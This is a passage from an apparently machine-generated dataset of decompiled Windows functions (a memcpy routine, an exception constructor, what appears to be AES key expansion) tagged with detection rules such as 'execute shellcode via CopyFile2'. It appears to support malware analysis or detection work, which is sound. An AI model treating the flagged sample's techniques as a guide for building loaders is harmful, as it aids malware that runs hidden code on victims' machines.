        "decompiled_code": "\nuchar (*) [32] fcn.140007990(uchar (*arg1) [32], uchar (*arg2) [32], uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uchar (*pauVar15) [32];\n    uchar (*pauVar16) [32];\n    uchar (*pauVar17) [32];\n    uint *puVar18;\n    uint *puVar19;\n    uchar (*pauVar20) [32];\n    uint *puVar21;\n    uint64_t uVar22;\n    int64_t iVar23;\n    uint64_t uVar24;\n    uint uVar25;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uchar auVar26 [32];\n    uchar auVar30 [32];\n    uchar auVar31 [32];\n    uchar auVar32 [32];\n    uchar auVar33 [32];\n    uchar auVar34 [32];\n    \n    pauVar15 = arg1;\n    if (arg3 < 0x10) {\n    // switch table (16 cases) at 0x140044000\n        switch(*(arg3 * 4 + 0x140044000) + 0x140000000) {\n        case 0x1400079be:\n            return pauVar15;\n        case 0x1400079c0:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            uVar2 = (*arg2)[0xe];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            (*arg1)[0xe] = uVar2;\n            return pauVar15;\n        case 0x1400079e0:\n            uVar3 = *(*arg2 + 8);\n            uVar2 = (*arg2)[10];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            (*arg1)[10] = uVar2;\n            return pauVar15;\n        case 0x1400079f8:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x140007a00:\n            uVar3 = *(*arg2 + 4);\n            uVar2 = (*arg2)[6];\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            (*arg1)[6] = uVar2;\n            return pauVar15;\n        case 0x140007a18:\n            uVar4 = *(*arg2 + 8);\n            uVar3 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            *(*arg1 + 0xc) = uVar3;\n            return pauVar15;\n        case 0x140007a2f:\n            uVar2 = (*arg2)[2];\n            **arg1 = **arg2;\n            (*arg1)[2] = uVar2;\n            return pauVar15;\n        case 0x140007a40:\n            uVar4 = *(*arg2 + 8);\n            uVar2 = (*arg2)[0xc];\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            (*arg1)[0xc] = uVar2;\n            return pauVar15;\n        case 0x140007a56:\n            uVar3 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar3;\n            return pauVar15;\n        case 0x140007a65:\n            uVar2 = (*arg2)[8];\n            **arg1 = **arg2;\n            (*arg1)[8] = uVar2;\n            return pauVar15;\n        case 0x140007a73:\n            uVar4 = *(*arg2 + 8);\n            **arg1 = **arg2;\n            *(*arg1 + 8) = uVar4;\n            return pauVar15;\n        case 0x140007a80:\n            uVar3 = *(*arg2 + 4);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar3;\n            return pauVar15;\n        case 0x140007a8f:\n            uVar2 = (*arg2)[4];\n            **arg1 = **arg2;\n            (*arg1)[4] = uVar2;\n            return pauVar15;\n        case 0x140007a9d:\n            **arg1 = **arg2;\n            return pauVar15;\n        case 0x140007aa4:\n            (*arg1)[0] = (*arg2)[0];\n            return pauVar15;\n        case 0x140007aaa:\n            **arg1 = **arg2;\n            return pauVar15;\n        }\n    }\n    if (arg3 < 0x21) {\n        uVar4 = *(*arg2 + 4);\n        uVar5 = *(*arg2 + 8);\n        uVar6 = *(*arg2 + 0xc);\n        puVar18 = arg2[-1] + arg3 + 0x10;\n        uVar25 = *puVar18;\n        uVar27 = puVar18[1];\n        uVar28 = puVar18[2];\n        uVar29 = puVar18[3];\n        **arg1 = **arg2;\n        *(*arg1 + 4) = uVar4;\n        *(*arg1 + 8) = uVar5;\n        *(*arg1 + 0xc) = uVar6;\n        puVar18 = arg1[-1] + arg3 + 0x10;\n        *puVar18 = uVar25;\n        puVar18[1] = uVar27;\n        puVar18[2] = uVar28;\n        puVar18[3] = uVar29;\n        return pauVar15;\n    }\n    if ((arg2 < arg1) && (arg1 < *arg2 + arg3)) {\n        iVar23 = arg2 - arg1;\n        puVar18 = arg1 + iVar23 + (arg3 - 0x10);\n        uVar4 = puVar18[1];\n        uVar5 = puVar18[2];\n        uVar6 = puVar18[3];\n        puVar19 = arg1[-1] + arg3 + 0x10;\n        uVar22 = arg3 - 0x10;\n        puVar21 = puVar19;\n        uVar25 = *puVar18;\n        uVar27 = uVar4;\n        uVar28 = uVar5;\n        uVar29 = uVar6;\n        if ((puVar19 & 0xf) != 0) {\n            puVar21 = puVar19 & 0xfffffffffffffff0;\n            puVar1 = puVar21 + iVar23;\n            uVar25 = *puVar1;\n            uVar27 = puVar1[1];\n            uVar28 = puVar1[2];\n            uVar29 = puVar1[3];\n            *puVar19 = *puVar18;\n            *(arg1[-1] + arg3 + 0x14) = uVar4;\n            *(arg1[-1] + arg3 + 0x18) = uVar5;\n            *(arg1[-1] + arg3 + 0x1c) = uVar6;\n            uVar22 = puVar21 - arg1;\n        }\n        uVar24 = uVar22 >> 7;\n        if (uVar24 != 0) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar18 = puVar21;\n            while( true ) {\n                puVar19 = puVar18 + iVar23 + -0x10;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar21 = puVar18 + iVar23 + -0x20;\n                uVar25 = *puVar21;\n                uVar27 = puVar21[1];\n                uVar28 = puVar21[2];\n                uVar29 = puVar21[3];\n                puVar21 = puVar18 + -0x20;\n                puVar18[-4] = *puVar19;\n                puVar18[-3] = uVar4;\n                puVar18[-2] = uVar5;\n                puVar18[-1] = uVar6;\n                puVar18[-8] = uVar25;\n                puVar18[-7] = uVar27;\n                puVar18[-6] = uVar28;\n                puVar18[-5] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x30;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x40;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                uVar24 = uVar24 - 1;\n                puVar18[-0xc] = *puVar19;\n                puVar18[-0xb] = uVar4;\n                puVar18[-10] = uVar5;\n                puVar18[-9] = uVar6;\n                puVar18[-0x10] = uVar25;\n                puVar18[-0xf] = uVar27;\n                puVar18[-0xe] = uVar28;\n                puVar18[-0xd] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x50;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x60;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                puVar18[-0x14] = *puVar19;\n                puVar18[-0x13] = uVar4;\n                puVar18[-0x12] = uVar5;\n                puVar18[-0x11] = uVar6;\n                puVar18[-0x18] = uVar25;\n                puVar18[-0x17] = uVar27;\n                puVar18[-0x16] = uVar28;\n                puVar18[-0x15] = uVar29;\n                puVar1 = puVar18 + iVar23 + -0x70;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                puVar19 = puVar21 + iVar23;\n                uVar25 = *puVar19;\n                uVar27 = puVar19[1];\n                uVar28 = puVar19[2];\n                uVar29 = puVar19[3];\n                if (uVar24 == 0) break;\n                puVar18[-0x1c] = *puVar1;\n                puVar18[-0x1b] = uVar4;\n                puVar18[-0x1a] = uVar5;\n                puVar18[-0x19] = uVar6;\n                *puVar21 = uVar25;\n                puVar18[-0x1f] = uVar27;\n                puVar18[-0x1e] = uVar28;\n                puVar18[-0x1d] = uVar29;\n                puVar18 = puVar21;\n            }\n            puVar18[-0x1c] = *puVar1;\n            puVar18[-0x1b] = uVar4;\n            puVar18[-0x1a] = uVar5;\n            puVar18[-0x19] = uVar6;\n            uVar22 = uVar22 & 0x7f;\n        }\n        for (uVar24 = uVar22 >> 4; uVar24 != 0; uVar24 = uVar24 - 1) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar21 = puVar21 + -4;\n            puVar18 = puVar21 + iVar23;\n            uVar25 = *puVar18;\n            uVar27 = puVar18[1];\n            uVar28 = puVar18[2];\n            uVar29 = puVar18[3];\n        }\n        if ((uVar22 & 0xf) != 0) {\n            uVar4 = *(*arg2 + 4);\n            uVar5 = *(*arg2 + 8);\n            uVar6 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar4;\n            *(*arg1 + 8) = uVar5;\n            *(*arg1 + 0xc) = uVar6;\n        }\n        *puVar21 = uVar25;\n        puVar21[1] = uVar27;\n        puVar21[2] = uVar28;\n        puVar21[3] = uVar29;\n        return arg1;\n    }\n    if (*0x14003e038 < 3) {\n        if ((arg3 < 0x801) || ((*0x14003fc7c & 2) == 0)) {\n            if (0x80 < arg3) {\n                iVar23 = (arg1 & 0xf) - 0x10;\n                puVar18 = arg1 - iVar23;\n                puVar21 = arg2 - iVar23;\n                arg3 = arg3 + iVar23;\n                if (0x80 < arg3) {\n                    do {\n                        uVar4 = puVar21[1];\n                        uVar5 = puVar21[2];\n                        uVar6 = puVar21[3];\n                        uVar25 = puVar21[4];\n                        uVar27 = puVar21[5];\n                        uVar28 = puVar21[6];\n                        uVar29 = puVar21[7];\n                        uVar7 = puVar21[8];\n                        uVar8 = puVar21[9];\n                        uVar9 = puVar21[10];\n                        uVar10 = puVar21[0xb];\n                        uVar11 = puVar21[0xc];\n                        uVar12 = puVar21[0xd];\n                        uVar13 = puVar21[0xe];\n                        uVar14 = puVar21[0xf];\n                        *puVar18 = *puVar21;\n                        puVar18[1] = uVar4;\n                        puVar18[2] = uVar5;\n                        puVar18[3] = uVar6;\n                        puVar18[4] = uVar25;\n                        puVar18[5] = uVar27;\n                        puVar18[6] = uVar28;\n                        puVar18[7] = uVar29;\n                        puVar18[8] = uVar7;\n                        puVar18[9] = uVar8;\n                        puVar18[10] = uVar9;\n                        puVar18[0xb] = uVar10;\n                        puVar18[0xc] = uVar11;\n                        puVar18[0xd] = uVar12;\n                        puVar18[0xe] = uVar13;\n                        puVar18[0xf] = uVar14;\n                        uVar4 = puVar21[0x11];\n                        uVar5 = puVar21[0x12];\n                        uVar6 = puVar21[0x13];\n                        uVar25 = puVar21[0x14];\n                        uVar27 = puVar21[0x15];\n                        uVar28 = puVar21[0x16];\n                        uVar29 = puVar21[0x17];\n                        uVar7 = puVar21[0x18];\n                        uVar8 = puVar21[0x19];\n                        uVar9 = puVar21[0x1a];\n                        uVar10 = puVar21[0x1b];\n                        uVar11 = puVar21[0x1c];\n                        uVar12 = puVar21[0x1d];\n                        uVar13 = puVar21[0x1e];\n                        uVar14 = puVar21[0x1f];\n                        puVar18[0x10] = puVar21[0x10];\n                        puVar18[0x11] = uVar4;\n                        puVar18[0x12] = uVar5;\n                        puVar18[0x13] = uVar6;\n                        puVar18[0x14] = uVar25;\n                        puVar18[0x15] = uVar27;\n                        puVar18[0x16] = uVar28;\n                        puVar18[0x17] = uVar29;\n                        puVar18[0x18] = uVar7;\n                        puVar18[0x19] = uVar8;\n                        puVar18[0x1a] = uVar9;\n                        puVar18[0x1b] = uVar10;\n                        puVar18[0x1c] = uVar11;\n                        puVar18[0x1d] = uVar12;\n                        puVar18[0x1e] = uVar13;\n                        puVar18[0x1f] = uVar14;\n                        puVar18 = puVar18 + 0x20;\n                        puVar21 = puVar21 + 0x20;\n                        arg3 = arg3 - 0x80;\n                    } while (0x7f < arg3);\n                }\n            }\n    // WARNING: Could not recover jumptable at 0x000140007ea6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (9 cases) at 0x140044088\n            pauVar15 = (*(*((arg3 + 0xf >> 4) * 4 + 0x140044088) + 0x140000000))();\n            return pauVar15;\n        }\n    }\n    else if (((arg3 < 0x2001) || (0x180000 < arg3)) || ((*0x14003fc7c & 2) == 0)) {\n        auVar26 = vmovdqu_avx(*arg2);\n        auVar34 = vmovdqu_avx(*(arg2[-1] + arg3));\n        if (0x100 < arg3) {\n            iVar23 = (arg1 & 0x1f) - 0x20;\n            pauVar16 = arg1 - iVar23;\n            arg2 = arg2 - iVar23;\n            arg3 = arg3 + iVar23;\n            if (0x100 < arg3) {\n                if (0x180000 < arg3) {\n                    do {\n                        uVar22 = arg3;\n                        pauVar20 = arg2;\n                        pauVar17 = pauVar16;\n                        auVar30 = vmovdqu_avx(*pauVar20);\n                        auVar31 = vmovdqu_avx(pauVar20[1]);\n                        auVar32 = vmovdqu_avx(pauVar20[2]);\n                        auVar33 = vmovdqu_avx(pauVar20[3]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *pauVar17 = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[1] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[2] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[3] = auVar30;\n                        auVar30 = vmovdqu_avx(pauVar20[4]);\n                        auVar31 = vmovdqu_avx(pauVar20[5]);\n                        auVar32 = vmovdqu_avx(pauVar20[6]);\n                        auVar33 = vmovdqu_avx(pauVar20[7]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        pauVar17[4] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[5] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[6] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[7] = auVar30;\n                        pauVar16 = pauVar17[8];\n                        arg2 = pauVar20[8];\n                        arg3 = uVar22 - 0x100;\n                    } while (0xff < uVar22 - 0x100);\n                    uVar24 = uVar22 - 0xe1 & 0xffffffffffffffe0;\n    // switch table (18 cases) at 0x140044064\n                    switch(uVar22) {\n                    case 0x1e1:\n                    case 0x1e2:\n                    case 0x1e3:\n                    case 0x1e4:\n                    case 0x1e5:\n                    case 0x1e6:\n                    case 0x1e7:\n                    case 0x1e8:\n                    case 0x1e9:\n                    case 0x1ea:\n                    case 0x1eb:\n                    case 0x1ec:\n                    case 0x1ed:\n                    case 0x1ee:\n                    case 0x1ef:\n                    case 0x1f0:\n                    case 0x1f1:\n                    case 0x1f2:\n                    case 499:\n                    case 500:\n                    case 0x1f5:\n                    case 0x1f6:\n                    case 0x1f7:\n                    case 0x1f8:\n                    case 0x1f9:\n                    case 0x1fa:\n                    case 0x1fb:\n                    case 0x1fc:\n                    case 0x1fd:\n                    case 0x1fe:\n                    case 0x1ff:\n                        auVar30 = vmovdqu_avx(*(*pauVar20 + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(*pauVar17 + uVar24) = auVar30;\n                    case 0x1c1:\n                    case 0x1c2:\n                    case 0x1c3:\n                    case 0x1c4:\n                    case 0x1c5:\n                    case 0x1c6:\n                    case 0x1c7:\n                    case 0x1c8:\n                    case 0x1c9:\n                    case 0x1ca:\n                    case 0x1cb:\n                    case 0x1cc:\n                    case 0x1cd:\n                    case 0x1ce:\n                    case 0x1cf:\n                    case 0x1d0:\n                    case 0x1d1:\n                    case 0x1d2:\n                    case 0x1d3:\n                    case 0x1d4:\n                    case 0x1d5:\n                    case 0x1d6:\n                    case 0x1d7:\n                    case 0x1d8:\n                    case 0x1d9:\n                    case 0x1da:\n                    case 0x1db:\n                    case 0x1dc:\n                    case 0x1dd:\n                    case 0x1de:\n                    case 0x1df:\n                    case 0x1e0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[1] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[1] + uVar24) = auVar30;\n                    case 0x1a1:\n                    case 0x1a2:\n                    case 0x1a3:\n                    case 0x1a4:\n                    case 0x1a5:\n                    case 0x1a6:\n                    case 0x1a7:\n                    case 0x1a8:\n                    case 0x1a9:\n                    case 0x1aa:\n                    case 0x1ab:\n                    case 0x1ac:\n                    case 0x1ad:\n                    case 0x1ae:\n                    case 0x1af:\n                    case 0x1b0:\n                    case 0x1b1:\n                    case 0x1b2:\n                    case 0x1b3:\n                    case 0x1b4:\n                    case 0x1b5:\n                    case 0x1b6:\n                    case 0x1b7:\n                    case 0x1b8:\n                    case 0x1b9:\n                    case 0x1ba:\n                    case 0x1bb:\n                    case 0x1bc:\n                    case 0x1bd:\n                    case 0x1be:\n                    case 0x1bf:\n                    case 0x1c0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[2] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[2] + uVar24) = auVar30;\n                    case 0x181:\n                    case 0x182:\n                    case 0x183:\n                    case 0x184:\n                    case 0x185:\n                    case 0x186:\n                    case 0x187:\n                    case 0x188:\n                    case 0x189:\n                    case 0x18a:\n                    case 0x18b:\n                    case 0x18c:\n                    case 0x18d:\n                    case 0x18e:\n                    case 399:\n                    case 400:\n                    case 0x191:\n                    case 0x192:\n                    case 0x193:\n                    case 0x194:\n                    case 0x195:\n                    case 0x196:\n                    case 0x197:\n                    case 0x198:\n                    case 0x199:\n                    case 0x19a:\n                    case 0x19b:\n                    case 0x19c:\n                    case 0x19d:\n                    case 0x19e:\n                    case 0x19f:\n                    case 0x1a0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[3] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[3] + uVar24) = auVar30;\n                    case 0x161:\n                    case 0x162:\n                    case 0x163:\n                    case 0x164:\n                    case 0x165:\n                    case 0x166:\n                    case 0x167:\n                    case 0x168:\n                    case 0x169:\n                    case 0x16a:\n                    case 0x16b:\n                    case 0x16c:\n                    case 0x16d:\n                    case 0x16e:\n                    case 0x16f:\n                    case 0x170:\n                    case 0x171:\n                    case 0x172:\n                    case 0x173:\n                    case 0x174:\n                    case 0x175:\n                    case 0x176:\n                    case 0x177:\n                    case 0x178:\n                    case 0x179:\n                    case 0x17a:\n                    case 0x17b:\n                    case 0x17c:\n                    case 0x17d:\n                    case 0x17e:\n                    case 0x17f:\n                    case 0x180:\n                        auVar30 = vmovdqu_avx(*(pauVar20[4] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[4] + uVar24) = auVar30;\n                    case 0x141:\n                    case 0x142:\n                    case 0x143:\n                    case 0x144:\n                    case 0x145:\n                    case 0x146:\n                    case 0x147:\n                    case 0x148:\n                    case 0x149:\n                    case 0x14a:\n                    case 0x14b:\n                    case 0x14c:\n                    case 0x14d:\n                    case 0x14e:\n                    case 0x14f:\n                    case 0x150:\n                    case 0x151:\n                    case 0x152:\n                    case 0x153:\n                    case 0x154:\n                    case 0x155:\n                    case 0x156:\n                    case 0x157:\n                    case 0x158:\n                    case 0x159:\n                    case 0x15a:\n                    case 0x15b:\n                    case 0x15c:\n                    case 0x15d:\n                    case 0x15e:\n                    case 0x15f:\n                    case 0x160:\n                        auVar30 = vmovdqu_avx(*(pauVar20[5] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[5] + uVar24) = auVar30;\n                    case 0x121:\n                    case 0x122:\n                    case 0x123:\n                    case 0x124:\n                    case 0x125:\n                    case 0x126:\n                    case 0x127:\n                    case 0x128:\n                    case 0x129:\n                    case 0x12a:\n                    case 299:\n                    case 300:\n                    case 0x12d:\n                    case 0x12e:\n                    case 0x12f:\n                    case 0x130:\n                    case 0x131:\n                    case 0x132:\n                    case 0x133:\n                    case 0x134:\n                    case 0x135:\n                    case 0x136:\n                    case 0x137:\n                    case 0x138:\n                    case 0x139:\n                    case 0x13a:\n                    case 0x13b:\n                    case 0x13c:\n                    case 0x13d:\n                    case 0x13e:\n                    case 0x13f:\n                    case 0x140:\n                        auVar30 = vmovdqu_avx(*(pauVar20[6] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[6] + uVar24) = auVar30;\n                    default:\n                        auVar34 = vmovdqu_avx(auVar34);\n                        *(pauVar17[-1] + uVar22) = auVar34;\n                    case 0x100:\n                        auVar26 = vmovdqu_avx(auVar26);\n                        *arg1 = auVar26;\n                        vzeroupper_avx();\n                        return pauVar15;\n                    }\n                }\n                do {\n                    auVar34 = vmovdqu_avx(*arg2);\n                    auVar30 = vmovdqu_avx(arg2[1]);\n                    auVar31 = vmovdqu_avx(arg2[2]);\n                    auVar32 = vmovdqu_avx(arg2[3]);\n                    *pauVar16 = auVar34;\n                    pauVar16[1] = auVar30;\n                    pauVar16[2] = auVar31;\n                    pauVar16[3] = auVar32;\n                    auVar34 = vmovdqu_avx(arg2[4]);\n                    auVar30 = vmovdqu_avx(arg2[5]);\n                    auVar31 = vmovdqu_avx(arg2[6]);\n                    auVar32 = vmovdqu_avx(arg2[7]);\n                    pauVar16[4] = auVar34;\n                    pauVar16[5] = auVar30;\n                    pauVar16[6] = auVar31;\n                    pauVar16[7] = auVar32;\n                    pauVar16 = pauVar16[8];\n                    arg2 = arg2[8];\n                    arg3 = arg3 - 0x100;\n                } while (0xff < arg3);\n            }\n        }\n    // WARNING: Could not recover jumptable at 0x000140007c02. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (27 cases) at 0x140044040\n        pauVar15 = (*(*((arg3 + 0x1f >> 5) * 4 + 0x140044040) + 0x140000000))(SUB328(auVar26, 0));\n        return pauVar15;\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        (*arg1)[0] = (*arg2)[0];\n        arg2 = *arg2 + 1;\n        arg1 = *arg1 + 1;\n    }\n    return pauVar15;\n}\n",
        "token_count": 7525
    },
    "1400017c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** fcn.1400017c0(code **arg1, int64_t arg2, uint *arg3)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    int64_t aiStack72 [2];\n    ulong uStack56;\n    uint64_t uStack48;\n    uchar auStack40 [16];\n    \n    auStack40 = CONCAT88(auStack40._0_8_, arg1);\n    uVar4 = *arg3;\n    uVar5 = arg3[1];\n    uVar6 = arg3[2];\n    uVar7 = arg3[3];\n    uStack56 = 0;\n    uStack48 = 0xf;\n    aiStack72[0] = 0;\n    iVar3 = -1;\n    do {\n        iVar3 = iVar3 + 1;\n    } while (*(arg2 + iVar3) != '\\0');\n    fcn.140002540(aiStack72, arg2, iVar3);\n    auStack40 = CONCAT412(uVar7, CONCAT48(uVar6, CONCAT44(uVar5, uVar4)));\n    fcn.1400013a0(arg1, auStack40, aiStack72);\n    if (0xf < uStack48) {\n        iVar3 = aiStack72[0];\n        if (0xfff < uStack48 + 1) {\n            iVar3 = *(aiStack72[0] + -8);\n            if (0x1f < (aiStack72[0] - iVar3) - 8U) {\n                fcn.14000c048(iVar3, uStack48 + 0x28);\n                pcVar1 = swi(3);\n                ppcVar2 = (*pcVar1)();\n                return ppcVar2;\n            }\n        }\n        fcn.140005b7c(iVar3);\n    }\n    *arg1 = vtable.std::ios_base::failure.0;\n    return arg1;\n}\n",
        "token_count": 466
    },
    "140001f7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140001f70(int64_t arg1, ulong arg2, ulong noname_2, uchar (*arg4) [16])\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uchar (*pauVar7) [16];\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int32_t iVar12;\n    uint8_t uVar13;\n    uint8_t uVar14;\n    uint8_t uVar15;\n    int64_t iVar16;\n    uint8_t *puVar17;\n    uint32_t uVar18;\n    uchar extraout_XMM0 [16];\n    uchar auVar19 [16];\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    ulong var_50h;\n    uchar auStack424 [32];\n    uint8_t uStack392;\n    uint32_t uStack388;\n    uint32_t uStack384;\n    uchar (*pauStack376) [16];\n    int64_t iStack368;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uchar auStack344 [16];\n    uint8_t auStack328 [240];\n    uint64_t uStack88;\n    \n    uStack88 = *0x14003e020 ^ auStack424;\n    uStack388 = arg2 >> 4;\n    uStack360 = str.3bcdefgh._0_4_;\n    uStack356 = str.3bcdefgh._4_4_;\n    uStack352 = *0x14003ec38;\n    uStack348 = *0x14003ec3c;\n    uStack384 = arg2;\n    pauStack376 = arg4;\n    iStack368 = arg1;\n    if ((arg2 & 0xf) == 0) {\n        puVar17 = auStack328 + 0xd;\n        auStack328[0] = *0x14003ec40;\n        auStack328[1] = *0x14003ec41;\n        auStack328[2] = *0x14003ec42;\n        auStack328[3] = *0x14003ec43;\n        auStack328[4] = *0x14003ec44;\n        auStack328[5] = *0x14003ec45;\n        auStack328[6] = *0x14003ec46;\n        auStack328[7] = str.__0Ie_[0];\n        auStack328[8] = str.__0Ie_[1];\n        auStack328[9] = str.__0Ie_[2];\n        auStack328[10] = str.__0Ie_[3];\n        auStack328[11] = str.__0Ie_[4];\n        auStack328[12] = str.__0Ie_[5];\n        auStack328[14] = *0x14003ec4e;\n        uVar18 = str.__0Ie_[6];\n        auStack328[15] = *0x14003ec4f;\n        auStack328[13] = str.__0Ie_[6];\n        iVar12 = 6;\n        do {\n            uStack392 = puVar17[2];\n            uVar3 = puVar17[-1];\n            uVar4 = puVar17[1];\n            uVar8 = uVar18;\n            uVar14 = uVar4;\n            uVar15 = uStack392;\n            uVar13 = uVar3;\n            if ((iVar12 - 2U & 3) == 0) {\n                iVar16 = iVar12 - 2U & 0xfffffffc;\n                uVar13 = str.cw[(uVar18 & 0xfffffff0) + (uVar18 & 0xf)] ^ *(iVar16 + 0x1400391f0);\n                uVar8 = str.cw[(uVar4 & 0xfffffff0) + (uVar4 & 0xf)] ^ *(iVar16 + 0x1400391f1);\n                uVar14 = str.cw[(uStack392 & 0xfffffff0) + (uStack392 & 0xf)] ^ *(iVar16 + 0x1400391f2);\n                uVar15 = str.cw[(uVar3 & 0xfffffff0) + (uVar3 & 0xf)] ^ *(iVar16 + 0x1400391f3);\n            }\n            uVar13 = uVar13 ^ puVar17[-0xd];\n            uVar8 = uVar8 ^ puVar17[-0xc];\n            uVar14 = uVar14 ^ puVar17[-0xb];\n            uVar9 = iVar12 + -1 >> 0x1f & 3;\n            uVar15 = uVar15 ^ puVar17[-10];\n            uVar6 = iVar12 + -1 + uVar9;\n            puVar17[3] = uVar13;\n            puVar17[4] = uVar8;\n            puVar17[5] = uVar14;\n            puVar17[6] = uVar15;\n            if ((uVar6 & 3) == uVar9) {\n                uVar10 = uVar14;\n                iVar16 = (uVar6 >> 2) * 4;\n                uVar6 = uVar13;\n                uVar9 = uVar13;\n                uVar14 = str.cw[uVar15] ^ *(iVar16 + 0x1400391f2);\n                uVar13 = str.cw[uVar8] ^ *(iVar16 + 0x1400391f0);\n                uVar8 = str.cw[uVar10] ^ *(iVar16 + 0x1400391f1);\n                uVar15 = str.cw[(uVar6 & 0xfffffff0) + (uVar9 & 0xf)] ^ *(iVar16 + 0x1400391f3);\n            }\n            uVar13 = uVar13 ^ puVar17[-9];\n            puVar17[7] = uVar13;\n            uVar8 = uVar8 ^ puVar17[-8];\n            uVar9 = iVar12 >> 0x1f & 3;\n            uVar6 = iVar12 + uVar9;\n            puVar17[8] = uVar8;\n            uVar14 = uVar14 ^ puVar17[-7];\n            puVar17[9] = uVar14;\n            uVar15 = uVar15 ^ puVar17[-6];\n            puVar17[10] = uVar15;\n            if ((uVar6 & 3) == uVar9) {\n                uVar10 = uVar14;\n                iVar16 = (uVar6 >> 2) * 4;\n                uVar6 = uVar13;\n                uVar9 = uVar13;\n                uVar14 = str.cw[uVar15] ^ *(iVar16 + 0x1400391f2);\n                uVar13 = str.cw[uVar8] ^ *(iVar16 + 0x1400391f0);\n                uVar8 = str.cw[uVar10] ^ *(iVar16 + 0x1400391f1);\n                uVar15 = str.cw[(uVar6 & 0xfffffff0) + (uVar9 & 0xf)] ^ *(iVar16 + 0x1400391f3);\n            }\n            uVar13 = uVar13 ^ puVar17[-5];\n            puVar17[0xb] = uVar13;\n            uVar8 = uVar8 ^ puVar17[-4];\n            uVar9 = iVar12 + 1 >> 0x1f & 3;\n            uVar6 = iVar12 + 1 + uVar9;\n            puVar17[0xc] = uVar8;\n            uVar14 = uVar14 ^ puVar17[-3];\n            puVar17[0xd] = uVar14;\n            uVar15 = uVar15 ^ puVar17[-2];\n            puVar17[0xe] = uVar15;\n            if ((uVar6 & 3) == uVar9) {\n                uVar10 = uVar14;\n                iVar16 = (uVar6 >> 2) * 4;\n                uVar6 = uVar13;\n                uVar9 = uVar13;\n                uVar14 = str.cw[uVar15] ^ *(iVar16 + 0x1400391f2);\n                uVar13 = str.cw[uVar8] ^ *(iVar16 + 0x1400391f0);\n                uVar8 = 